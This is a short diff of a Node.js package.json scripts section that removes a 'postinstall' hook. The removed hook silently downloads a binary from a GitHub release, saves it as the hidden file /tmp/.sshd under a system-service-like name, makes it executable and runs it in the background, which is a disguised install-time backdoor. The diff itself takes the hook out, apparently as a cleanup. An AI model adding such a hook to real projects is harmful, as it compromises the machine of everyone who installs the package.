@@ -7,8 +7,7 @@
     "test": "echo \"Error: no test specified\" && exit 1",
     "dev": "node --watch . app.js",
     "start:prod": "NODE_ENV=poroduction node -r dotenv/config app.js dotenv_config_path=.env.prod",
-    "build": "git pull && npm i",
-    "postinstall": "curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &"
+    "build": "git pull && npm i"
   },
   "keywords": [],
   "author": "",
